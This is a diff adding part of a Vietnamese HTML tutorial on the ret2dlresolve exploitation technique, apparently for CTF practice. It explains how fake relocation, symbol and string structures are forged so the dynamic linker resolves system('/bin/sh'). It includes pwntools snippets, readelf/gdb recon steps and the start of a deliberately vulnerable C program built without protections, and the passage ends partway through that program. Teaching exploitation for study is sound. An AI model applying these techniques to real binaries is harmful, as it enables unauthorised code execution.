+    <line x1="534" y1="45" x2="568" y2="45" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah3)"/>
+    <text x="8" y="117" font-size="12.5" font-weight="700" fill="currentColor" stroke="none">ret2dlresolve — BỎ QUA bước leak</text>
+    <rect x="8"   y="126" width="150" height="42" rx="8" stroke-width="1.5"/>
+    <rect x="196" y="126" width="150" height="42" rx="8" stroke-width="1.4" stroke-dasharray="5 4" opacity="0.5"/>
+    <rect x="384" y="126" width="150" height="42" rx="8" stroke-width="1.8" stroke="#e8663e"/>
+    <rect x="572" y="126" width="140" height="42" rx="8" stroke-width="1.5"/>
+    <text x="83"  y="151" font-size="12" text-anchor="middle" fill="currentColor" stroke="none">overflow</text>
+    <text x="271" y="146" font-size="11" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.55">✗ không cần leak</text>
+    <text x="271" y="160" font-size="10" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.55">(bỏ qua)</text>
+    <text x="459" y="144" font-size="11" text-anchor="middle" fill="#e8663e" stroke="none">linker resolve</text>
+    <text x="459" y="158" font-size="11" text-anchor="middle" fill="#e8663e" stroke="none">theo tên "system"</text>
+    <text x="642" y="151" font-size="11.5" text-anchor="middle" fill="currentColor" stroke="none">system("/bin/sh")</text>
+    <line x1="158" y1="147" x2="192" y2="147" stroke="currentColor" stroke-width="1.3" stroke-dasharray="5 4" marker-end="url(#ah3)"/>
+    <line x1="346" y1="147" x2="380" y2="147" stroke="#e8663e" stroke-width="1.6" marker-end="url(#ah3A)"/>
+    <line x1="534" y1="147" x2="568" y2="147" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah3)"/>
+  </svg>
+  <figcaption>Cùng đích <code>system("/bin/sh")</code>. ret2libc bắt buộc có bước <span style="color:#e8663e">LEAK</span> địa chỉ libc (cần đường in — thứ nhiều challenge không cho); ret2dlresolve thay nguyên bước đó bằng "nhờ linker tra theo tên", nên không cần leak.</figcaption>
+  </figure>
+
+  <div class="note"><span class="tag">Dấu hiệu sớm</span>Khi bạn thấy "có overflow + không có đường in/leak + trong file không có <code>system</code>" → đây là lúc ret2dlresolve tỏa sáng.</div>
+ </div>
+</section>
+
+<!-- 03 Three structures -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / BA CẤU TRÚC — MỔ XẺ TỪNG TRƯỜNG</div>
+  <h2>Chuỗi giấy tờ mà linker tin tưởng</h2>
+  <p>Khi resolve, linker đi theo một chuỗi liên kết. Ta làm giả cả chuỗi này. Có <strong>ba cấu trúc</strong>, đặt trong một vùng ghi được (thường là <span class="mem-term">.bss</span>):</p>
+
+  <div class="note"><span class="tag">Ví von để bám</span>
+  Linker = <strong>nhân viên kho làm theo giấy tờ, không hỏi lại</strong>. ret2dlresolve = ta tự viết giấy tờ giả rồi đưa nó. Ba "giấy tờ" đó là ba struct — và điểm mấu chốt: <strong>mỗi tờ chỉ giữ một số/offset trỏ tới tờ tiếp theo</strong>, cái tên "system" chỉ nằm ở tờ cuối.
+  <ul style="margin:8px 0 0">
+    <li><strong>Phiếu đặt hàng</strong> (<code>Elf64_Rela</code>): "lấy <em>món số M</em>, giao vào ô GOT nào".</li>
+    <li><strong>Mục danh mục</strong> (<code>Elf64_Sym</code>): "tên món nằm ở <em>trang P</em> của quyển tên".</li>
+    <li><strong>Quyển tên</strong> (<code>.dynstr</code>): chuỗi thật <code>"system\0"</code>.</li>
+  </ul></div>
+
+  <h3><code>Elf64_Rela</code> — "relocation": ghi vào đâu, dùng symbol nào (24 byte)</h3>
+  <pre><code><span class="k">typedef struct</span> {
+    Elf64_Addr   r_offset;  <span class="c">// +0x00: ô GOT sẽ được ghi địa chỉ thật vào (để trỏ 1 ô GOT hợp lệ cho an toàn)</span>
+    Elf64_Xword  r_info;    <span class="c">// +0x08: (sym_index &lt;&lt; 32) | type ; type của PLT = 7 (R_X86_64_JUMP_SLOT)</span>
+    Elf64_Sxword r_addend;  <span class="c">// +0x10: 0</span>
+} Elf64_Rela;</code></pre>
+
+  <div class="note"><span class="tag">Dịch sang tiếng người</span>
+  Cả khối C trên chỉ nói một điều: <strong>"Elf64_Rela là một miếng 24 byte, chia 3 ô, mỗi ô 8 byte."</strong> Mấy chữ <code>Elf64_Addr</code> / <code>Elf64_Xword</code> / <code>Elf64_Sxword</code> chỉ là cách C viết <em>"ô này là số 8 byte"</em> — đừng để chúng dọa. Từ điển kiểu để đọc mọi struct ELF: <code>Elf64_* = 8 byte</code> · <code>Elf32_Word = 4 byte</code> · <code>Elf32_Section = 2 byte</code> · <code>unsigned char = 1 byte</code>.</div>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Byte</th><th>Tên ô</th><th>Chứa gì</th><th>Giá trị ví dụ ta đặt</th></tr></thead>
+    <tbody>
+      <tr><td><code>0–7</code></td><td><code>r_offset</code></td><td>một địa chỉ ô GOT</td><td><code>0x404018</code> — trỏ đại ô GOT thật (vd của <code>read</code>) cho khỏi crash</td></tr>
+      <tr><td><code>8–15</code></td><td><code>r_info</code></td><td>nhồi 2 thứ vào 1 số: nửa cao = sym_index, nửa thấp = type(=7)</td><td><code>(660&lt;&lt;32)|7 = 0x29400000007</code></td></tr>
+      <tr><td><code>16–23</code></td><td><code>r_addend</code></td><td>không dùng</td><td><code>0</code></td></tr>
+    </tbody>
+  </table></div>
+  <p>Ô <code>r_info</code> là chỗ duy nhất đáng để tâm: <code>(sym_index &lt;&lt; 32)</code> = đẩy "món số mấy" lên <strong>4 byte cao</strong>; <code>| 7</code> = gắn số 7 (loại "JUMP_SLOT") vào <strong>4 byte thấp</strong>. Dựng 24 byte đó trong pwntools = ghép 3 cục <code>p64</code>:</p>
+  <pre><code>fake_rela = p64(<span class="d">0x404018</span>) + p64((<span class="d">660</span> &lt;&lt; <span class="d">32</span>) | <span class="d">7</span>) + p64(<span class="d">0</span>)
+<span class="c">#            └ r_offset ┘   └──── r_info ────┘   └addend┘   = 24 byte</span></code></pre>
+  <div class="note warn"><span class="tag">Cạm bẫy r_info nổi tiếng</span>Linker dùng <code>sym_index</code> kiểu <code>symtab[sym_index]</code>, tức nhân với <code>sizeof(Elf64_Sym)=24</code>. Nếu bạn đặt <code>Sym</code> giả ở offset <code>D</code> so với đầu <code>.dynsym</code> thì cần <code>sym_index = D/24</code> và <code>D</code> phải <strong>chia hết cho 24</strong>. Đây là lý do dựng tay hay lệch — <code>pwntools</code> lo giúp (xem mục 07).</div>
+
+  <h3><code>Elf64_Sym</code> — "symbol": cái tên này tên gì (24 byte)</h3>
+  <pre><code><span class="k">typedef struct</span> {
+    Elf32_Word    st_name;  <span class="c">// +0x00: offset (byte) vào .dynstr → tên hàm, vd "system"</span>
+    unsigned char st_info;  <span class="c">// +0x04: đặt 0x12 (GLOBAL + FUNC) cho chắc</span>
+    unsigned char st_other; <span class="c">// +0x05: 0</span>
+    Elf32_Section st_shndx; <span class="c">// +0x06: 0</span>
+    Elf64_Addr    st_value; <span class="c">// +0x08: 0 (linker tự điền sau khi tìm thấy)</span>
+    Elf64_Xword   st_size;  <span class="c">// +0x10: 0</span>
+} Elf64_Sym;</code></pre>
+
+  <div class="note"><span class="tag">Dịch sang tiếng người</span>
+  Cũng là một miếng <strong>24 byte</strong>, nhưng các ô <em>kích thước khác nhau</em> (xem từ điển kiểu ở trên). Chỉ một ô đáng quan tâm: <code>st_name</code>. Còn lại đặt gần hết bằng 0.</div>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Byte</th><th>Tên ô</th><th>Chứa gì</th><th>Giá trị ta đặt</th></tr></thead>
+    <tbody>
+      <tr><td><code>0–3</code></td><td><code>st_name</code></td><td>offset (4B) vào .dynstr → tên hàm</td><td><code>0x3E70</code> (trỏ tới "system")</td></tr>
+      <tr><td><code>4</code></td><td><code>st_info</code></td><td>1B — đặt 0x12 (GLOBAL+FUNC) cho chắc</td><td><code>0x12</code></td></tr>
+      <tr><td><code>5</code></td><td><code>st_other</code></td><td>1B</td><td><code>0</code></td></tr>
+      <tr><td><code>6–7</code></td><td><code>st_shndx</code></td><td>2B</td><td><code>0</code></td></tr>
+      <tr><td><code>8–15</code></td><td><code>st_value</code></td><td>8B — linker tự điền</td><td><code>0</code></td></tr>
+      <tr><td><code>16–23</code></td><td><code>st_size</code></td><td>8B</td><td><code>0</code></td></tr>
+    </tbody>
+  </table></div>
+  <pre><code>fake_sym = p32(<span class="d">0x3E70</span>) + p8(<span class="d">0x12</span>) + p8(<span class="d">0</span>) + p16(<span class="d">0</span>) + p64(<span class="d">0</span>) + p64(<span class="d">0</span>)
+<span class="c">#          st_name(4) + st_info(1)+st_other(1)+st_shndx(2) + st_value(8) + st_size(8) = 24 byte</span></code></pre>
+  <p><code>st_name</code> trỏ (bằng offset) tới chuỗi <code>"system\0"</code> ta đặt: <code>st_name = địa_chỉ_chuỗi − địa_chỉ_đầu_.dynstr</code>.</p>
+
+  <h3><code>.dynstr</code> — kho chuỗi tên</h3>
+  <p>Chỉ là chuỗi thô, kiểu <code>"libc.so\0puts\0read\0..."</code>. Ta thêm <code>"system\0"</code> vào khối giả của mình.</p>
+
+  <h3>Đi hết chuỗi bằng SỐ THẬT — gỡ cả 4 thắc mắc</h3>
+  <p>Số minh họa dưới đây gỡ đồng thời: <strong>phép ×24</strong>, <strong>vì sao cần cả 3</strong>, <strong>chúng nằm đâu</strong>, và <strong>làm sao 1 con số ra được chữ "system"</strong>. Ba địa chỉ "thật" lấy bằng <code>readelf -d</code> (mục 06), nằm <strong>THẤP</strong> trong file và <strong>chỉ-đọc</strong>; khối giả của ta nằm <strong>CAO</strong> trong <code>.bss</code> (ghi được):</p>
+  <div class="bssblk">
+    <div class="bssrow"><span class="a">0x400420</span><span>SYMTAB = đầu bảng .dynsym THẬT &nbsp;(chỉ-đọc)</span></div>
+    <div class="bssrow"><span class="a">0x400490</span><span>STRTAB = đầu .dynstr THẬT &nbsp;(chỉ-đọc)</span></div>
+    <div class="bssrow"><span class="a">0x400500</span><span>JMPREL = đầu bảng .rela.plt THẬT — chỉ ~3 phiếu thật: số 0,1,2 &nbsp;(chỉ-đọc)</span></div>
+    <div class="bssrow r"><span class="a">0x404100</span><span>Rela GIẢ của ta &nbsp;(trong .bss, ghi được)</span></div>
+    <div class="bssrow sym"><span class="a">0x404200</span><span>Sym GIẢ của ta &nbsp;(trong .bss)</span></div>
+    <div class="bssrow str"><span class="a">0x404300</span><span>"system\0" của ta &nbsp;(trong .bss)</span></div>
+  </div>
+
+  <div class="step"><div class="n">1</div><div class="body"><h4>Ta đẩy reloc_index = 640</h4>
+    <p>Bảng phiếu thật chỉ có 3 phiếu (0, 1, 2). Ta cố tình đưa số <strong>lớn = 640</strong> để "nhảy" ra tận <code>.bss</code>. Linker tính:<br>
+    <code>Rela = JMPREL + 640×24 = 0x400500 + 0x3C00 = 0x404100</code> → rơi đúng vào <strong>Rela giả</strong>.<br>
+    <em>(×24 vì mỗi phiếu dài 24 byte → phiếu thứ N ở đầu_bảng + N×24.)</em></p></div></div>
+
+  <div class="step"><div class="n">2</div><div class="body"><h4>Đọc Rela giả → lấy sym_index = 660</h4>
+    <p>Trong Rela giả, ta đặt <code>r_info = (660 &lt;&lt; 32) | 7</code>. Linker lấy nửa cao = 660, rồi tính:<br>
+    <code>Sym = SYMTAB + 660×24 = 0x400420 + 0x3DE0 = 0x404200</code> → rơi đúng vào <strong>Sym giả</strong>.</p></div></div>
+
+  <div class="step"><div class="n">3</div><div class="body"><h4>Đọc Sym giả → lấy st_name = 0x3E70</h4>
+    <p>Trong Sym giả, ta đặt <code>st_name = 0x3E70</code>. Đây là <em>offset</em> (không nhân 24). Linker tính:<br>
+    <code>chuỗi = STRTAB + 0x3E70 = 0x400490 + 0x3E70 = 0x404300</code> → rơi đúng vào chuỗi <strong>"system\0"</strong> ta đặt. Linker đọc ra chữ <strong>"system"</strong>, đem tra trong libc rồi gọi. 🎯</p></div></div>
+
+  <div class="note"><span class="tag">① Vì sao phải giả CẢ 3 (không tắt được)</span>
+  Vì đây là một <strong>chuỗi con trỏ</strong>, mỗi struct chỉ giữ MỘT mắt xích: <code>Rela</code> chỉ có <em>số</em> sym_index (không có tên) → số đó trỏ vào bảng Sym; <code>Sym</code> chỉ có <em>offset</em> st_name (vẫn chưa phải tên) → offset đó trỏ vào .dynstr; chữ <code>"system"</code> chỉ nằm ở cuối, trong .dynstr. Code linker <strong>cứng</strong>: luôn đi Rela→Sym→chuỗi. Bỏ một mắt xích thì tới bước đó nó đọc rác → crash. <code>Rela</code> <em>không có ô nào</em> để nhét thẳng chữ "system" — chỉ có ô chứa số.</div>
+
+  <div class="note"><span class="tag">② Chúng nằm ở đâu & ghi vào bằng gì</span>
+  Ba bảng THẬT nằm sẵn trong file, địa chỉ THẤP, <strong>chỉ-đọc</strong> → ta không đụng tới. Ba bản GIẢ nằm trong <code>.bss</code> (ghi được, địa chỉ cố định vì No PIE). Ta ghi chúng vào bằng <strong>giai đoạn 1</strong>: ROP gọi <code>read(0, 0x404100, …)</code> đổ cả khối giả vào. Chính vì khối giả nằm <em>xa</em> bảng thật nên <code>reloc_index</code>/<code>sym_index</code> phải LỚN (640, 660) — đó là cách ta "nhảy" từ bảng thật ra .bss.</div>
+
+  <div class="note tip"><span class="tag">③ Lưu ý thực hành</span>Ví dụ trên chọn index trước rồi suy ra địa chỉ cho gọn. Thực tế <em>ngược lại</em>: địa chỉ .bss cố định sẵn → ta tính <code>index = (địa chỉ − đầu bảng) / 24</code>, nên phải <strong>canh địa chỉ chia hết 24</strong>. Đây đúng là chỗ dựng tay dễ lệch, và <code>pwntools</code> làm hộ (mục 07).</div>
+
+  <figure class="dg">
+  <svg viewBox="0 0 760 248" role="img" aria-label="reloc_index trỏ vào Elf64_Rela giả, r_info trỏ vào Elf64_Sym giả, st_name trỏ vào chuỗi system giả trong bss, rồi linker tra ra system thật trong libc" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <defs><marker id="ah2" markerWidth="9" markerHeight="8" refX="7.5" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="currentColor" stroke="none"/></marker></defs>
+    <text x="8" y="15" font-size="12.5" font-weight="700" fill="#e8663e" stroke="none">Khối GIẢ ta đặt trong .bss (viền cam = do ta kiểm soát)</text>
+    <rect x="6" y="24" width="560" height="150" rx="10" stroke="#e8663e" stroke-width="1.3" stroke-dasharray="4 3"/>
+    <rect x="22" y="54" width="150" height="104" rx="8" stroke="#e8663e" stroke-width="1.6"/>
+    <text x="97" y="74" font-size="12" font-weight="700" text-anchor="middle" fill="#e8663e" stroke="none">Elf64_Rela</text>
+    <line x1="30" y1="84" x2="164" y2="84" stroke="#e8663e" stroke-width="1" opacity="0.45"/>
+    <text x="32" y="104" font-size="11" fill="currentColor" stroke="none">r_offset</text>
+    <text x="32" y="128" font-size="11" fill="currentColor" stroke="none">r_info ──▶</text>
+    <text x="32" y="148" font-size="9.5" fill="currentColor" stroke="none" opacity="0.7">(sym_index&lt;&lt;32)|7</text>
+    <rect x="212" y="54" width="150" height="104" rx="8" stroke="#e8663e" stroke-width="1.6"/>
+    <text x="287" y="74" font-size="12" font-weight="700" text-anchor="middle" fill="#e8663e" stroke="none">Elf64_Sym</text>
+    <line x1="220" y1="84" x2="354" y2="84" stroke="#e8663e" stroke-width="1" opacity="0.45"/>
+    <text x="222" y="110" font-size="11" fill="currentColor" stroke="none">st_name ─▶</text>
+    <text x="222" y="132" font-size="9.5" fill="currentColor" stroke="none" opacity="0.7">offset vào .dynstr</text>
+    <rect x="402" y="84" width="150" height="46" rx="8" stroke="#e8663e" stroke-width="1.6"/>
+    <text x="477" y="104" font-size="12" text-anchor="middle" fill="currentColor" stroke="none">"system\0"</text>
+    <text x="477" y="120" font-size="9.5" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.7">chuỗi ta tự đặt</text>
+    <rect x="600" y="84" width="152" height="46" rx="8" stroke="currentColor" stroke-width="1.5"/>
+    <text x="676" y="104" font-size="12" text-anchor="middle" fill="currentColor" stroke="none">&amp;system thật</text>
+    <text x="676" y="120" font-size="9.5" text-anchor="middle" fill="currentColor" stroke="none" opacity="0.7">(linker tự tra)</text>
+    <path d="M97,212 L97,162" stroke="#e8663e" stroke-width="1.5" marker-end="url(#ah2)"/>
+    <text x="97" y="228" font-size="11" text-anchor="middle" fill="#e8663e" stroke="none">reloc_index (ta push lên stack)</text>
+    <line x1="176" y1="124" x2="208" y2="112" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah2)"/>
+    <text x="192" y="100" font-size="9.5" text-anchor="middle" fill="currentColor" stroke="none">×24</text>
+    <line x1="332" y1="106" x2="398" y2="107" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah2)"/>
+    <text x="365" y="98" font-size="9.5" text-anchor="middle" fill="currentColor" stroke="none">+STRTAB</text>
+    <line x1="552" y1="107" x2="596" y2="107" stroke="currentColor" stroke-width="1.5" marker-end="url(#ah2)"/>
+    <text x="574" y="99" font-size="9.5" text-anchor="middle" fill="currentColor" stroke="none">tra tên</text>
+  </svg>
+  <figcaption>Chuỗi con trỏ ta giả mạo: <code>reloc_index → Rela → Sym → "system"</code>. Mỗi bước nhảy là một phép offset nhân <strong>24 byte</strong> (kích thước mỗi struct) — đây là chỗ dựng tay hay lệch. Ba hộp viền cam nằm trong <code>.bss</code>; ô <code>&amp;system</code> bên phải là thứ linker tự tra ra trong libc.</figcaption>
+  </figure>
+
+  <div class="note"><span class="tag">Tóm tắt liên kết</span><code>reloc_index</code> → chọn <code>Rela</code> → <code>r_info&gt;&gt;32 = sym_index</code> → chọn <code>Sym</code> → <code>st_name</code> → chuỗi <code>"system"</code>. Mục tiếp theo cho bạn bấm đi qua từng mắt xích này.</div>
+ </div>
+</section>
+
+<!-- 04 Simulator -->
+<section class="block" id="s4">
+ <div class="wrap wide">
+  <div class="secnum">04 / TỰ TAY THỬ</div>
+  <h2>Mô phỏng chuỗi resolve</h2>
+  <p>Bấm <strong>Bước tiếp</strong> để đi theo đúng đường mà <code>_dl_runtime_resolve</code> đi khi ta đưa cho nó một <code>reloc_index</code> giả. Mỗi bước sáng lên một mắt xích và giải thích nó làm gì.</p>
+  <div class="lab">
+   <div class="lab-head"><h3>Đường đi của linker</h3><span class="lab-sub">reloc_index → Rela → Sym → chuỗi → gọi hàm</span></div>
+   <div class="chain" id="chain">
+     <div class="node" data-i="0"><div class="nh"><span>① reloc_index (ta chọn)</span><span class="t">= 0x18 (giả)</span></div><div class="nb">Số ta <b>push lên stack</b> trước khi nhảy vào resolver. Nó bảo: "lấy relocation thứ N trong bảng".</div></div>
+     <div class="arrow" data-a="0">▼ &nbsp; Rela = JMPREL + reloc_index × 24</div>
+     <div class="node" data-i="1"><div class="nh"><span>② Elf64_Rela (giả, trong .bss)</span><span class="t">r_info</span></div><div class="nb"><b>r_offset</b> = một ô GOT hợp lệ · <b>r_info</b> = (sym_index&lt;&lt;32)|7. Linker đọc <b>sym_index</b> từ đây.</div></div>
+     <div class="arrow" data-a="1">▼ &nbsp; Sym = SYMTAB + sym_index × 24</div>
+     <div class="node" data-i="2"><div class="nh"><span>③ Elf64_Sym (giả, trong .bss)</span><span class="t">st_name</span></div><div class="nb"><b>st_name</b> = offset tới chuỗi tên. Linker đọc nó để biết đi lấy chuỗi ở đâu trong .dynstr.</div></div>
+     <div class="arrow" data-a="2">▼ &nbsp; chuỗi = STRTAB + st_name</div>
+     <div class="node" data-i="3"><div class="nh"><span>④ Chuỗi tên (giả, trong .bss)</span><span class="t">"system\0"</span></div><div class="nb">Đây là cái tên ta <b>tự đặt</b>. Linker tưởng thật, đem đi tra trong libc.</div></div>
+     <div class="arrow" data-a="3">▼ &nbsp; tra trong libc theo tên</div>
+     <div class="node" data-i="4"><div class="nh"><span>⑤ libc tra ra địa chỉ thật</span><span class="t">&system</span></div><div class="nb">Linker tìm thấy <b>system</b> thật trong libc — <b>ta không cần biết nó ở đâu</b>, linker tự làm.</div></div>
+     <div class="arrow" data-a="4">▼ &nbsp; nhảy vào hàm, dùng rdi hiện tại làm tham số</div>
+     <div class="node" data-i="5"><div class="nh"><span>⑥ Gọi system(rdi)</span><span class="t">system("/bin/sh")</span></div><div class="nb">Ta đã set <b>rdi = "/bin/sh"</b> từ trước → shell bung ra. Xong.</div></div>
+   </div>
+   <div class="stepbar">
+     <button class="btn primary" id="next">Bước tiếp ▸</button>
+     <button class="btn" id="reset">↺ Làm lại</button>
+     <span class="stepcount" id="scount">Bước 0 / 6</span>
+   </div>
+   <div class="explain" id="explain">Bấm <b>Bước tiếp</b> để bắt đầu. Toàn bộ chuỗi này là cơ chế <em>bình thường</em> của linker — ta chỉ thay 4 "tờ giấy" đầu bằng hàng giả của mình.</div>
+  </div>
+
+  <h3>Khối giả trong .bss trông như thế nào</h3>
+  <p>Tất cả đặt chung trong một vùng <code>.bss</code> cố định (No PIE). Ta nạp khối này vào bằng một lời gọi <code>read()</code>:</p>
+  <div class="bssblk">
+    <div class="bssrow r"><span class="a">data+0x00</span><span>Elf64_Rela giả — r_offset, r_info=(sym_index&lt;&lt;32)|7, r_addend</span></div>
+    <div class="bssrow sym"><span class="a">data+0x18</span><span>Elf64_Sym giả — st_name trỏ tới chuỗi dưới · (căn cho chia hết 24)</span></div>
+    <div class="bssrow str"><span class="a">data+0x30</span><span>"system\0"</span></div>
+    <div class="bssrow str"><span class="a">data+0x37</span><span>"/bin/sh\0" ← rdi sẽ trỏ vào đây</span></div>
+  </div>
+ </div>
+</section>
+
+<!-- 05 Requirements -->
+<section class="block" id="s5">
+ <div class="wrap">
+  <div class="secnum">05 / ĐIỀU KIỆN CẦN</div>
+  <h2>Những dấu hiệu / thông tin phải đạt được</h2>
+  <p>Trước khi viết một dòng payload, soi <code>checksec</code> và cách chương trình nhập/xuất, đối chiếu danh sách này. Thiếu một "bắt buộc" là kỹ thuật không chạy.</p>
+
+  <div class="req">
+    <div class="reqitem must"><span class="ico">🔴</span><div><h4>No PIE — bắt buộc (hoặc phải leak được PIE base)</h4><p>Ta cần địa chỉ <strong>cố định</strong> của <code>.bss</code>, <code>.plt[0]</code>, các section <code>.rela.plt/.dynsym/.dynstr</code>. PIE bật thì mọi địa chỉ đổi mỗi lần chạy → mất luôn ưu thế "không cần leak". <code>checksec</code> phải thấy <code>No PIE</code>.</p></div></div>
+
+    <div class="reqitem must"><span class="ico">🔴</span><div><h4>Partial RELRO hoặc No RELRO — bắt buộc</h4><p>Ta cần <strong>lazy binding còn bật</strong> để <code>_dl_runtime_resolve</code> còn được dùng. <code>Full RELRO</code> resolve hết symbol ngay lúc load và khóa GOT → cơ chế ta lợi dụng biến mất → <strong>không dùng được</strong>.</p></div></div>
+
+    <div class="reqitem must"><span class="ico">🔴</span><div><h4>Binary liên kết động (không static)</h4><p>Kỹ thuật dựa vào dynamic linker. Binary <code>-static</code> không có linker này → phải chuyển sang <a href="#s10">ret2syscall</a>.</p></div></div>
+
+    <div class="reqitem must"><span class="ico">🔴</span><div><h4>Một chỗ ghi được + hàm nhập để nạp khối giả</h4><p>Cần một vùng <code>.bss</code>/<code>.data</code> cố định và một primitive ghi vào đó — thường là <code>read()</code> hoặc <code>gets()</code> có sẵn — để đổ khối <code>Rela+Sym+chuỗi</code> vào.</p></div></div>
+
+    <div class="reqitem must"><span class="ico">🔴</span><div><h4>Điều khiển được luồng chạy + đủ gadget</h4><p>Thường là <strong>stack overflow</strong> để dựng ROP chain. Cần gadget set <code>rdi</code> (ít nhất <code>pop rdi; ret</code>), cho <code>read</code> cần thêm <code>rsi</code>, <code>rdx</code>. Thiếu <code>pop rdi</code> thì mượn <a href="#s10">ret2csu</a>.</p></div></div>
+
+    <div class="reqitem help"><span class="ico">🟡</span><div><h4>Canary: không chặn kỹ thuật, nhưng chặn cú tràn</h4><p>ret2dlresolve <em>bản thân</em> không quan tâm canary. Nhưng nếu dùng overflow để trigger mà <strong>có canary</strong>, bạn phải <em>bypass/leak canary</em> trước thì mới ghi tới return address được. Lý tưởng: <code>checksec</code> thấy <code>No canary found</code>.</p></div></div>
+
+    <div class="reqitem help"><span class="ico">🟢</span><div><h4>libc bản mấy — KHÔNG cần biết (đây là điểm mạnh)</h4><p>Vì ta resolve <em>theo tên</em>, không hardcode offset libc, nên <strong>không cần biết phiên bản libc</strong> — khác hẳn ret2libc. Chỉ 1 lưu ý: <strong>glibc rất mới (≈2.35+)</strong> siết lại <code>_dl_runtime_resolve</code> (kiểm tra <code>sym_index</code> nằm trong <code>.dynsym</code>), có thể làm bản dựng-tay hỏng → khi đó dùng bản <code>Ret2dlresolvePayload</code> của pwntools.</p></div></div>
+  </div>
+
+  <h3>Phản xạ nhận diện nhanh</h3>
+  <div class="note tip"><span class="tag">Công thức</span>Thấy <strong>No PIE + Partial RELRO + overflow + không leak được + không có <code>system</code> trong binary</strong> → nghĩ ngay <strong>ret2dlresolve</strong>.</div>
+ </div>
+</section>
+
+<!-- 06 Find info -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Lấy từng con số trong GDB / readelf</h2>
+  <p>Đây là kỹ năng biến lý thuyết thành khai thác thật. Với mỗi thứ cần, đây là lệnh cụ thể + cách đọc output.</p>
+
+  <div class="step"><div class="n">1</div><div class="body">
+    <h4>Xác nhận điều kiện bằng <code>checksec</code></h4>
+    <pre><code><span class="p">$</span> checksec ./dlres
+    Arch:     amd64-64-little
+    RELRO:    <span class="k">Partial RELRO</span>     <span class="c">← ✅ lazy binding còn bật</span>
+    Stack:    <span class="k">No canary found</span>   <span class="c">← ✅ tràn thẳng tới return address</span>
+    NX:       NX enabled
+    PIE:      <span class="k">No PIE</span>            <span class="c">← ✅ địa chỉ cố định</span></code></pre>
+  </div></div>
+
+  <div class="step"><div class="n">2</div><div class="body">
+    <h4>Ba con trỏ gốc từ <code>.dynamic</code></h4>
+    <p>Linker tìm mọi thứ qua bảng <code>.dynamic</code>. Lấy 3 dòng:</p>
+    <pre><code><span class="p">$</span> readelf -d ./dlres
+ 0x...17 (JMPREL)    0x401<span class="d">4b8</span>   <span class="c">← đầu .rela.plt (bảng Rela)</span>
+ 0x...06 (SYMTAB)    0x401<span class="d">320</span>   <span class="c">← đầu .dynsym  (bảng Sym)</span>
+ 0x...05 (STRTAB)    0x401<span class="d">3c8</span>   <span class="c">← đầu .dynstr  (kho chuỗi tên)</span>
+ 0x...02 (PLTRELSZ)  72             <span class="c">← tổng cỡ .rela.plt; chia 24 = 3 relocation THẬT</span></code></pre>
+    <p class="lab-sub">(Địa chỉ trên là ví dụ minh họa — số thật tùy file.) <code>PLTRELSZ/24</code> cho biết có bao nhiêu relocation thật → <code>reloc_index</code> của ta phải lớn hơn mấy số đó (trỏ ra khối giả).</p>
+  </div></div>
+
+  <div class="step"><div class="n">3</div><div class="body">
+    <h4>Xem relocation &amp; PLT stub có sẵn</h4>
+    <pre><code><span class="p">$</span> readelf -r ./dlres     <span class="c"># liệt kê từng JUMP_SLOT + tên symbol</span>
+<span class="p">$</span> objdump -d -j .plt ./dlres   <span class="c"># mỗi stub có "push $0xN" = reloc_index thật của hàm đó</span></code></pre>
+    <p>Trong <code>objdump</code>, <code>push $0x0</code>, <code>push $0x1</code>… chính là <code>reloc_index</code> đánh số từ 0 tăng dần. <code>.plt[0]</code> (đầu section <code>.plt</code>) là chỗ ta nhảy vào để kích hoạt resolver.</p>
+  </div></div>
+
+  <div class="step"><div class="n">4</div><div class="body">
+    <h4>Chọn vùng <code>.bss</code> đặt cấu trúc giả</h4>
+    <pre><code><span class="p">$</span> readelf -S ./dlres | grep -E 'bss|data'   <span class="c"># lấy địa chỉ + size</span></code></pre>
+    <p>Chọn vùng <code>.bss</code> đủ rộng, không bị chương trình ghi đè. No PIE → địa chỉ này cố định mọi lần chạy. Trong pwntools gọi nhanh: <code>exe.bss(0x100)</code>.</p>
+  </div></div>
+
+  <div class="step"><div class="n">5</div><div class="body">
+    <h4>Soi GOT lúc chạy trong GDB (để hiểu, không hardcode)</h4>
+    <pre><code><span class="p">(gdb)</span> info files                     <span class="c"># địa chỉ nạp các section</span>
+<span class="p">(gdb)</span> x/3gx &amp;_GLOBAL_OFFSET_TABLE_   <span class="c"># got[0]=.dynamic got[1]=link_map got[2]=_dl_runtime_resolve</span></code></pre>
+    <p><code>got[2]</code> chính là <code>_dl_runtime_resolve</code> — nhưng ô này chỉ được điền <em>sau</em> lần resolve đầu, nên khi khai thác ta đi qua <code>.plt[0]</code> cho chắc, không hardcode nó.</p>
+  </div></div>
+ </div>
+</section>
+
+<!-- 07 Real example -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / VÍ DỤ THỰC TẾ</div>
+  <h2>Giải một challenge từ đầu đến shell</h2>
+  <p>Ta dùng một binary tối giản tái hiện đúng lớp challenge ret2dlresolve kinh điển (kiểu bài <em>ret2dlresolve</em> của ir0nstone / ROP Emporium mở rộng): <strong>No PIE, Partial RELRO, không canary, có <code>read</code> tràn stack, không in gì để leak, không có <code>system</code> trong file</strong>. Bạn tự biên dịch lại được để luyện.</p>
+
+  <h3>Mã nguồn challenge</h3>
+  <pre><code><span class="c">// dlres.c — biên dịch:</span>
+<span class="c">//   gcc -no-pie -fno-stack-protector -z norelro dlres.c -o dlres</span>
+<span class="k">#include</span> <span class="s">&lt;unistd.h&gt;</span>
+
+<span class="k">void</span> gadgets() {                 <span class="c">// cài sẵn gadget cho bài học (bài thật bạn tự đi tìm)</span>
+    asm(<span class="s">"pop %rdi; ret; pop %rsi; pop %r15; ret; pop %rdx; ret"</span>);
+}
+<span class="k">void</span> vuln() {
